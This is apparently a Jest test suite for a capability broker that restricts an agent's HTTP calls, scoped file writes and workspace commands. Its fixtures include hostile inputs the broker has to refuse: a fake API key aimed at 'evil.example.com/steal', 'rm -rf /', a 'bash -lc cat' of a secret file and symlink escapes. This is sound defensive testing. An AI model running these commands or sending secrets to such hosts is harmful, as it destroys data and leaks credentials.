import { execFile } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

const BROKER = path.resolve(__dirname, '..', 'scripts', 'shelly-capability-broker.js');

interface RunResult {
  code: number;
  out: string;
  err: string;
  processErr: string;
  audit: any[];
}

function makeDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'cap-broker-'));
}

/**
 * Run the broker against a live local http server; returns exit code + files.
 * Async (execFile, not execFileSync) so an in-process test server can serve the
 * child request — a synchronous spawn would block jest's event loop and deadlock.
 */
function runBroker(
  dir: string,
  opts: {
    url: string;
    method?: string;
    body?: string;
    authRef?: string;
    tainted?: boolean;
    approved?: boolean;
    env?: Record<string, string>;
    budget?: { calls: number; startedAtMs: number };
    nodeOptions?: string;
  },
): Promise<RunResult> {
  const outFile = path.join(dir, 'out.txt');
  const errFile = path.join(dir, 'err.txt');
  const auditFile = path.join(dir, 'audit.jsonl');
  const budgetFile = path.join(dir, 'budget.json');
  const envFile = path.join(dir, '.env');

  if (opts.env) {
    const lines = Object.entries(opts.env).map(([k, v]) => `${k}='${String(v).replace(/'/g, "'\\''")}'`);
    fs.writeFileSync(envFile, lines.join('\n') + '\n');
  }
  if (opts.budget) fs.writeFileSync(budgetFile, JSON.stringify(opts.budget));

  const argv = [
    BROKER,
    '--method',
    opts.method || 'POST',
    '--url',
    opts.url,
    '--auth-ref',
    opts.authRef || '',
    '--tainted',
    opts.tainted ? '1' : '0',
    '--approved',
    opts.approved ? '1' : '0',
    '--secret-env-file',
    envFile,
    '--audit-log',
    auditFile,
    '--budget-file',
    budgetFile,
    '--timeout-seconds',
    '10',
    '--out',
    outFile,
    '--err',
    errFile,
  ];
  if (opts.method !== 'GET') {
    const bodyFile = path.join(dir, 'body.json');
    fs.writeFileSync(bodyFile, opts.body ?? '{}');
    argv.push('--body-file', bodyFile);
  }

  return new Promise((resolve) => {
    execFile(
      'node',
      argv,
      { encoding: 'utf8', env: { ...process.env, NODE_OPTIONS: opts.nodeOptions || '' } },
      (err: any, _stdout, stderr) => {
        const code = err ? (typeof err.code === 'number' ? err.code : 1) : 0;
        const read = (f: string) => (fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : '');
        const auditText = read(auditFile).trim();
        const audit = auditText ? auditText.split('\n').map((l) => JSON.parse(l)) : [];
        resolve({ code, out: read(outFile), err: read(errFile), processErr: stderr, audit });
      },
    );
  });
}

function runBrokerArgs(dir: string, argv: string[], env?: Record<string, string>): Promise<RunResult> {
  const outFile = path.join(dir, 'out.txt');
  const errFile = path.join(dir, 'err.txt');
  const auditFile = path.join(dir, 'audit.jsonl');
  const fullArgv = [
    BROKER,
    ...argv,
    '--audit-log',
    auditFile,
    '--out',
    outFile,
    '--err',
    errFile,
  ];
  return new Promise((resolve) => {
    execFile('node', fullArgv, { encoding: 'utf8', env: { ...process.env, ...(env || {}) } }, (err: any, _stdout, stderr) => {
      const code = err ? (typeof err.code === 'number' ? err.code : 1) : 0;
      const read = (f: string) => (fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : '');
      const auditText = read(auditFile).trim();
      const audit = auditText ? auditText.split('\n').map((l) => JSON.parse(l)) : [];
      resolve({ code, out: read(outFile), err: read(errFile), processErr: stderr, audit });
    });
  });
}

describe('shelly-capability-broker: policy gates (no network)', () => {
  let dir: string;
  beforeEach(() => {
    dir = makeDir();
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('DENYs a secret spent against a mismatched host and never sends', async () => {
    const r = await runBroker(dir, {
      url: 'https://evil.example.com/steal',
      authRef: 'perplexity',
      env: { PERPLEXITY_API_KEY: 'pplx-SECRETSECRETSECRETSECRET' },
    });
    expect(r.code).toBe(40);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('ref-host-mismatch');
    // The secret must never appear in any output file.
    expect(r.err + r.out + JSON.stringify(r.audit)).not.toContain('pplx-SECRET');
  });

  it('DENYs plaintext http to a remote host', async () => {
    const r = await runBroker(dir, { url: 'http://api.groq.com/x' });
    expect(r.code).toBe(40);
    expect(r.audit[0].signals).toContain('insecure-scheme');
  });

  it('blocks a non-allowlist host fail-closed when not approved (41)', async () => {
    const r = await runBroker(dir, { url: 'https://hooks.example.com/incoming' });
    expect(r.code).toBe(41);
    expect(r.audit[0].decision).toBe('approve');
    expect(r.audit[0].signals).toContain('non-allowlist-host');
  });

  it('fails closed with NO_SECRET (43) when the auth_ref env var is missing', async () => {
    const r = await runBroker(dir, { url: 'https://api.perplexity.ai/chat/completions', authRef: 'perplexity' });
    expect(r.code).toBe(43);
  });

  it('blocks tainted input plus a live secret fail-closed when not approved, even on the bound allowlisted host (41)', async () => {
    const r = await runBroker(dir, {
      url: 'https://api.perplexity.ai/chat/completions',
      authRef: 'perplexity',
      tainted: true,
      env: { PERPLEXITY_API_KEY: 'pplx-SECRETSECRETSECRETSECRET' },
    });
    expect(r.code).toBe(41);
    expect(r.audit[0].decision).toBe('approve');
    expect(r.audit[0].signals).toContain('tainted-secret-spend');
    // The secret must never appear in any output file even though it was loaded.
    expect(r.err + r.out + JSON.stringify(r.audit)).not.toContain('pplx-SECRET');
  });

  it('fails closed with BUDGET (42) when the call budget is exhausted', async () => {
    const r = await runBroker(dir, {
      url: 'https://api.groq.com/openai/v1/chat/completions',
      authRef: 'groq',
      env: { GROQ_API_KEY: 'gsk_SECRETSECRETSECRETSECRET' },
      budget: { calls: 40, startedAtMs: Date.now() },
    });
    expect(r.code).toBe(42);
    expect(r.err).toMatch(/budget/);
  });
});

describe('shelly-capability-broker: secret injection + send (loopback server)', () => {
  let dir: string;
  let server: import('http').Server;
  let port: number;
  let lastAuthHeader: string | undefined;

  beforeEach((done) => {
    dir = makeDir();
    // A loopback host is allowlisted (127.0.0.1). We register an auth_ref bound to
    // 127.0.0.1 by monkeypatching via a custom ref is not possible, so instead we
    // test the un-authed loopback send path AND the budget increment/audit here.
    const httpMod = require('http');
    server = httpMod.createServer((req: any, res: any) => {
      lastAuthHeader = req.headers['authorization'];
      let body = '';
      req.on('data', (c: any) => (body += c));
      req.on('end', () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, echoedLen: body.length }));
      });
    });
    server.listen(0, '127.0.0.1', () => {
      port = (server.address() as any).port;
      done();
    });
  });
  afterEach((done) => {
    fs.rmSync(dir, { recursive: true, force: true });
    server.close(() => done());
  });

  it('allows an un-authed loopback POST, records a redacted audit, and increments the budget', async () => {
    const r = await runBroker(dir, { url: `http://127.0.0.1:${port}/v1/chat/completions`, body: '{"hi":1}' });
    expect(r.code).toBe(0);
    expect(r.out).toContain('"ok":true');
    expect(r.audit[0].decision).toBe('allow');
    expect(r.audit[0].status).toBe(200);
    expect(r.audit[0].authRef).toBeNull();
    // budget file advanced to 1
    const budget = JSON.parse(fs.readFileSync(path.join(dir, 'budget.json'), 'utf8'));
    expect(budget.calls).toBe(1);
    // no auth header was sent for an un-authed call
    expect(lastAuthHeader).toBeUndefined();
  });

  it('redacts a synchronous request error and audits the failed attempt', async () => {
    const secret = 'gsk_SECRETSECRETSECRETSECRET';
    const preload = path.join(dir, 'throw-request.js');
    fs.writeFileSync(
      preload,
      `require('http').request = () => { throw new Error('request failed with ${secret}'); };\n`,
    );

    const r = await runBroker(dir, {
      url: `http://127.0.0.1:${port}/v1/chat/completions`,
      body: '{}',
      nodeOptions: `--require=${preload}`,
    });

    expect(r.code).toBe(23);
    expect(r.err).toContain('request failed with <redacted>');
    expect(r.processErr).toBe('');
    expect(r.err + r.processErr + JSON.stringify(r.audit)).not.toContain(secret);
    expect(r.audit).toHaveLength(1);
    expect(r.audit[0]).toMatchObject({ decision: 'allow', status: 0, ok: false });
    expect(r.audit[0].reason).toBe('request failed with <redacted>');
  });
});

describe('shelly-capability-broker: FS-001 scoped.fs', () => {
  let dir: string;
  beforeEach(() => {
    dir = makeDir();
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('writes inside a declared root and records a scoped.fs audit', async () => {
    const root = path.join(dir, 'root');
    const input = path.join(root, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.writeFileSync(input, 'ok');
    fs.writeFileSync(roots, root + '\n');
    const dest = path.join(root, 'nested', 'result.md');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', dest, '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(0);
    expect(fs.readFileSync(dest, 'utf8')).toBe('ok');
    expect(r.audit[0].kind).toBe('scoped.fs');
    expect(r.audit[0].decision).toBe('allow');
  });

  it('denies writes outside declared roots', async () => {
    const root = path.join(dir, 'root');
    const outside = path.join(dir, 'outside');
    const input = path.join(root, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    fs.writeFileSync(input, 'nope');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', path.join(outside, 'x.md'), '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(45);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
    expect(fs.existsSync(path.join(outside, 'x.md'))).toBe(false);
  });

  it('denies writes through an in-root symlink that points outside', async () => {
    const root = path.join(dir, 'root');
    const outside = path.join(dir, 'outside');
    const input = path.join(root, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    fs.symlinkSync(outside, path.join(root, 'link-out'), 'dir');
    fs.writeFileSync(input, 'nope');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', path.join(root, 'link-out', 'x.md'), '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(45);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
    expect(fs.existsSync(path.join(outside, 'x.md'))).toBe(false);
  });

  it('denies writes to an in-root dangling symlink whose target is outside', async () => {
    const root = path.join(dir, 'root');
    const outside = path.join(dir, 'outside');
    const input = path.join(root, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    fs.symlinkSync(path.join(outside, 'evil.txt'), path.join(root, 'link.md'), 'file');
    fs.writeFileSync(input, 'payload');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', path.join(root, 'link.md'), '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(45);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
    expect(fs.existsSync(path.join(outside, 'evil.txt'))).toBe(false);
  });

  it('denies writes below an in-root dangling symlink directory whose target is outside', async () => {
    const root = path.join(dir, 'root');
    const outside = path.join(dir, 'outside');
    const input = path.join(root, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    fs.symlinkSync(path.join(outside, 'missing-dir'), path.join(root, 'link-dir'), 'dir');
    fs.writeFileSync(input, 'payload');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', path.join(root, 'link-dir', 'evil.txt'), '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(45);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
    expect(fs.existsSync(path.join(outside, 'missing-dir', 'evil.txt'))).toBe(false);
  });

  it('denies fs.write input files outside declared roots', async () => {
    const root = path.join(dir, 'root');
    const input = path.join(dir, 'input.txt');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.writeFileSync(input, 'secret-ish');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'fs.write', '--path', path.join(root, 'x.md'), '--input-file', input, '--roots-file', roots]);
    expect(r.code).toBe(45);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].reason).toContain('input file is outside');
    expect(r.audit[0].path).toBe(path.join(root, 'x.md'));
    expect(fs.existsSync(path.join(root, 'x.md'))).toBe(false);
  });
});

describe('shelly-capability-broker: EXEC-001 workspace.exec', () => {
  let dir: string;
  beforeEach(() => {
    dir = makeDir();
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('executes inside a root with API-key-like env stripped', async () => {
    const root = path.join(dir, 'workspace');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(roots, root + '\n');
    fs.writeFileSync(command, 'env');

    const r = await runBrokerArgs(
      dir,
      ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots, '--timeout-seconds', '5'],
      { GEMINI_API_KEY: 'AIzaSECRETSECRETSECRETSECRETSECRETSECRET' },
    );
    expect(r.code).toBe(0);
    expect(r.out).not.toContain('GEMINI_API_KEY');
    expect(r.out + r.err + JSON.stringify(r.audit)).not.toContain('AIzaSECRET');
    expect(r.audit[0].kind).toBe('workspace.exec');
    expect(r.audit[0].decision).toBe('allow');
  });

  it('allows curated cat only for files inside declared roots', async () => {
    const root = path.join(dir, 'workspace');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    const inside = path.join(root, 'note.txt');
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(inside, 'VISIBLE');
    fs.writeFileSync(command, 'cat note.txt');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots]);
    expect(r.code).toBe(0);
    expect(r.out).toBe('VISIBLE');
    expect(r.audit[0].decision).toBe('allow');
  });

  it('denies curated path arguments outside declared roots', async () => {
    const root = path.join(dir, 'workspace');
    const outside = path.join(dir, 'outside');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    const secret = path.join(outside, 'secret.txt');
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(secret, 'TOPSECRET');
    fs.writeFileSync(command, `cat ${secret}`);
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots]);
    expect(r.code).toBe(46);
    expect(r.out + r.err + JSON.stringify(r.audit)).not.toContain('TOPSECRET');
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
  });

  it('denies unsupported raw shell commands', async () => {
    const root = path.join(dir, 'workspace');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(command, 'bash -lc cat /tmp/secret.txt');
    fs.writeFileSync(roots, root + '\n');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots]);
    expect(r.code).toBe(46);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('unsupported-command');
  });

  it('denies cwd outside roots', async () => {
    const root = path.join(dir, 'workspace');
    const outside = path.join(dir, 'outside');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    fs.mkdirSync(outside);
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(roots, root + '\n');
    fs.writeFileSync(command, 'printf ok');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', outside, '--roots-file', roots]);
    expect(r.code).toBe(46);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('outside-root');
  });

  it('hard-denies CRITICAL commands', async () => {
    const root = path.join(dir, 'workspace');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(roots, root + '\n');
    fs.writeFileSync(command, 'rm -rf /');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots]);
    expect(r.code).toBe(46);
    expect(r.audit[0].decision).toBe('deny');
    expect(r.audit[0].signals).toContain('critical-command');
  });

  it('enforces timeout', async () => {
    const root = path.join(dir, 'workspace');
    const roots = path.join(dir, 'roots.txt');
    fs.mkdirSync(root);
    const command = path.join(root, 'cmd.sh');
    fs.writeFileSync(roots, root + '\n');
    fs.writeFileSync(command, 'sleep 2');

    const r = await runBrokerArgs(dir, ['--op', 'workspace.exec', '--command-file', command, '--cwd', root, '--roots-file', roots, '--timeout-seconds', '1']);
    expect(r.code).toBe(124);
    expect(r.err).toContain('timed out');
    expect(r.audit[0].exitCode).toBe(124);
  });
});
